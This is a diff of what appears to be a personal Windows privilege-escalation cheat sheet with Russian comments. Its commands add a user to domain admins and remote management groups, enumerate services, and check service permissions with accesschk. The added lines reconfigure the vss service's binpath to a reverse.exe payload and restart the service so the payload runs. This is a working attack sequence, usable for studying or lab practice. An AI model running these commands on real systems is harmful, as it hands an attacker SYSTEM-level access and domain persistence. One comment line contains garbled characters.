@@ -216,7 +216,7 @@ net group "domain admins" max /add /domain
 net localgroup 'Remote Management Users' max /add
 
 
-# Enumeration running services
+# Сервисы Windows
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
 
 C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc - проверка разрешений доступа к слжбам виндовс 
@@ -225,7 +225,22 @@ sc qc daclsvc - используется для получения информ�
 
 sc query daclsvc - информация о состянии службы (старт, стоп)
 
-sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"" - смена пути к файлу сервиса
+services
+
+
+------Если есть группа и привелегии по управлению сервисами  --->>>
+
+
+
+
+sc config vss binpath= "\"C:\PrivEsc\reverse.exe\"" - смена пути к файлу сервиса
+
+
+
+sc.exe stop vss
+sc.exe start vss
+
+
 
 # Узнать у кого доступ в директорию
 
